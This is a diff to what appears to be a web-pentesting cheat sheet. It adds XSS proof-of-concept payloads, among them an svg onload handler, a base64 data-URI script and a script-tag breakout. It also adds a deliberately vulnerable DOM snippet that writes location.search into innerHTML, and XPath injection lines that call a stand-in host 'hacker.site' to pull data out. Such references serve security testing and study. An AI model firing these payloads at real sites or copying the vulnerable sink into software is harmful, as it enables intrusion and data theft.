@@ -99,6 +99,35 @@ http://www.businessinfo.co.uk/labs/mxss/
 ### XSS Poliglote
 
 https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
+### Examples
+#### HTML Tag
+<div>
+attack
+</div>
+
+<svg/onload=alert(1)
+
+#### HTML Tag Attributes
+
+<input value="attack"/>
+adaa"><a/href="data:text/html;base64,"PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=">show
+
+#### <script> Tag:
+<script>
+var name="attack";
+</div>
+ala";alert(1);//
+
+#### Event Attributes
+
+<button onclick="reserve(attack);">Okay!</button>
+
+alert(1)
+
+Dom Based
+<script>var ok = location.search.replace("?ok=", "");domE1.innerHTML = "<a href='"+ok+"'>ok</a>";
+
+javascript:alert(1)
 
 ## JavaScript Encoding and Compressor:
 
@@ -331,7 +360,17 @@ echo "hi" > ok.txt && aws s3 cp ok.txt 's3://<BUCKET>/' -acl -public-read
 ### Tools
 
 https://github.com/clarketm/s3recon
+  
+## XPATH
 
+* and doc('http://hacker.site/')
+  
+* and doc('http://hacker.site/', name(/*) ))
+  
+### Wordlists for SQLI e XPath - Authentication Bypass
+
+https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/Auth_Bypass.txt
+  
 ## SQLI and XPATH
 
 ### Wordlist for SQL Injection - Bypass
@@ -342,9 +381,7 @@ https://gist.githubusercontent.com/zetc0de/f4146eb278805946ab064a753eac6a02/raw/
 
 https://github.com/OWASP/www-community/blob/master/pages/attacks/SQL_Injection_Bypassing_WAF.md
 
-### Wordlists for SQLI e XPath - Authentication Bypass
 
-https://raw.githubusercontent.com/payloadbox/sql-injection-payload-list/master/Intruder/exploit/Auth_Bypass.txt
 
 ## Local File Inclusion - LFI
 
